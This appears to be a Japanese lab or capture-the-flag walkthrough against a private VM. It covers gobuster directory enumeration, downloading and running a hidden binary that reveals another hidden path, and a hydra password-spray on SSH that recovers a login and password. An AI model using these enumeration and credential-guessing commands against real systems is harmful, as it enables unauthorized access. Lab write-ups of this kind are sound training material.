〇ディレクトリ調査

gobuster dir -u http://192.168.0.101 -w /usr/share/wordlists/dirb/common.txt

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:                     http://192.168.0.101

\[+\] Method:                  GET

\[+\] Threads:                 10

\[+\] Wordlist:                /usr/share/wordlists/dirb/common.txt

\[+\] Negative Status codes:   404

\[+\] User Agent:              gobuster/3.6

\[+\] Timeout:                 10s

\===============================================================

Starting gobuster in directory enumeration mode

\===============================================================

/.htaccess            (Status: 403) \[Size: 289\]

/.hta                 (Status: 403) \[Size: 284\]

/.htpasswd            (Status: 403) \[Size: 289\]

/index.html           (Status: 200) \[Size: 36\]

/robots.txt           (Status: 200) \[Size: 31\]

/secret               (Status: 301) \[Size: 314\] \[--> http://192.168.0.101/secret/\]

/server-status        (Status: 403) \[Size: 293\]

Progress: 4614 / 4615 (99.98%)

\===============================================================

Finished

\===============================================================

![[webの調査② image 32.png]]

特になし

〇隠しファイルの調査

・隠しディレクトリの探索

lol.pcapの内容にあった”sup3rs3cr3tdirlol”へアクセスしてみる

http://192.168.0.101/sup3rs3cr3tdirlol

![[webの調査② image 33.png]]

roflmaoを発見

・ファイルの取得

wget http://192.168.0.101/sup3rs3cr3tdirlol/roflmao

--2024-02-15 14:12:31--  http://192.168.0.101/sup3rs3cr3tdirlol/roflmao

Connecting to 192.168.0.101:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 7296 (7.1K)

Saving to: ‘roflmao.1’

roflmao.1           100%\[================>\]   7.12K  --.-KB/s    in 0s

2024-02-15 14:12:31 (215 MB/s) - ‘roflmao.1’ saved \[7296/7296\]

![[webの調査② image 34.png]]

・ファイルの種類の確認

file roflmao

roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID\[sha1\]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped

![[webの調査② image 35.png]]

・stringsで中身をチェック

strings roflmao

/lib/ld-linux.so.2

libc.so.6

_IO_stdin_used

printf

__libc_start_main

__gmon_start__

GLIBC_2.0

PTRh

\[^_\]

Find address 0x0856BF to proceed

;*2$"

GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2

.symtab

.strtab

.shstrtab

.interp

.note.ABI-tag

.note.gnu.build-id

.gnu.hash

.dynsym

.dynstr

.gnu.version

.gnu.version_r

.rel.dyn

.rel.plt

.init

.text

.fini

.rodata

.eh_frame_hdr

.eh_frame

.init_array

.fini_array

.jcr

.dynamic

.got

.got.plt

.data

.bss

.comment

crtstuff.c

__JCR_LIST__

deregister_tm_clones

register_tm_clones

__do_global_dtors_aux

completed.6590

__do_global_dtors_aux_fini_array_entry

frame_dummy

__frame_dummy_init_array_entry

roflmao.c

__FRAME_END__

__JCR_END__

__init_array_end

_DYNAMIC

__init_array_start

_GLOBAL_OFFSET_TABLE_

__libc_csu_fini

_ITM_deregisterTMCloneTable

__x86.get_pc_thunk.bx

data_start

printf@@GLIBC_2.0

_edata

_fini

__data_start

__gmon_start__

__dso_handle

_IO_stdin_used

__libc_start_main@@GLIBC_2.0

__libc_csu_init

_end

_start

_fp_hw

__bss_start

main

_Jv_RegisterClasses

__TMC_END__

_ITM_registerTMCloneTable

_init

![[webの調査② image 36.png]]

・権限の変更と実行

chmod 777 roflmao

./roflmao

Find address 0x0856BF to proceed

![[webの調査② image 37.png]]

0x0856BF

・試してみる

http://192.168.0.101/0x0856BF

![[webの調査② image 38.png]]

再び隠しディレクトリが見つかる

・good_luckの調査

![[webの調査② image 39.png]]

![[webの調査② image 40.png]]

〇パスワードスプレー攻撃

hydra -L which_one_lol.txt -p Pass.txt 192.168.0.101 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-15 15:06:10

\[WARNING\] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

\[DATA\] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task

\[DATA\] attacking ssh://192.168.0.101:22/

\[22\]\[ssh\] host: 192.168.0.101   login: overflow   password: Pass.txt

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-15 15:06:13

![[webの調査② image 41.png]]

ユーザ名”overflow”はパスワード”Pass.txt”でsshログインできることが判明